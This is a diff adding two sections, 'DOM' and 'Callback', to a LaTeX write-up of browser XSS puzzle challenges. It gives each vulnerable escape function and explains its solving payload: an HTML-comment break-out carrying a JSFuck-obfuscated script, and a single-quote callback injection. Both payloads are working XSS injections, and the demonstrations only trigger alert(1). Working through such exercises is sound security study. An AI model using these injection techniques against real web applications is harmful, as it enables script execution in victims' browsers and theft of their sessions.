@@ -94,4 +94,72 @@ When the browser attempts to render this, it first sees an image tag, with an \v
 
 So the \verb`onerror` attribute's value runs as JavaScript code since the image \verb`_.gif` was not able to load because it does not exist.
 
+\section{DOM}
+
+This time we have a function that takes a string which must contain a `\#' symbol and manipulates the DOM to create an element of whatever type was specified before the `\#', passing as a parameter whatever was after the `\#'.
+
+\begin{verbatim}
+	function escape(s) {
+	    // Slightly too lazy to make two input fields.
+	    // Pass in something like "TextNode#foo"
+	    var m = s.split(/#/);
+
+	    // Only slightly contrived at this point.
+	    var a = document.createElement('div');
+	    a.appendChild(
+	        document['create'+m[0]].apply(document, m.slice(1)));
+	    return a.innerHTML;
+	}
+\end{verbatim}
+
+Attempting to create a text node containing script tags does not work, because the call to \verb`document.createTextNode` converts all less than and greater than symbols into their HTML codes. However, creating an HTML comment and then closing the comment within the string allows the rest of the string to be treated as HTML code. Therefore the following code successfully alerts `1'.
+
+\begin{verbatim}
+	Comment#><script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+
+	!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]
+	+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[]
+	)[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[
+	]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+
+	[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])
+	[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+
+	(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[
+	])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[
+	])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]
+	)[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(!
+	[]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]
+	]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]
+	]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])()</script>
+\end{verbatim}
+
+\section{Callback}
+
+In this challenge, the function takes a string which again is expected to contain a `\#' symbol. It then generates a script tag which attempts to call a function with the name given before the `\#', passing it a JavaScript object with a single property called ``userdata'' whose value is whatever was after the `\#'.
+
+\begin{verbatim}
+	function escape(s) {
+	    // Pass in "callback#userdata"
+	    var thing = s.split(/#/);
+
+	    if (!/^[a-zA-Z\[\]']*$/.test(thing[0]))
+	        return 'Invalid callback';
+	    var obj = {'userdata': thing[1] };
+	    var json = JSON.stringify(obj).replace(/</g, '\\u003c');
+	    return "<script>" + thing[0] + "(" + json +")</script>";
+	}
+\end{verbatim}
+
+What worked in this case was to give a single quote as the function name, which was allowed according to the validation performed in the function, and to start the user data with a single quote as well. This has the effect of putting the code which started the object all in a string, which left the text after the `\#' to be interpreted as JavaScript code.
+
+After the \verb`'#'`, we can put any symbol such as a semicolon, ampersand or plus followed by \verb`alert(1)`, to cause the alert to be triggered. Then we would need to use two forward slashes to comment out the rest of the intended JavaScript which closed the object and function call. So the final input would look like this.
+
+\begin{verbatim}
+	'#';alert(1)//
+\end{verbatim}
+
+This would be converted by the function into what follows.
+
+\begin{verbatim}
+	<script>'({"userdata":"';alert(1)//"})</script>
+\end{verbatim}
+
 \end{document}
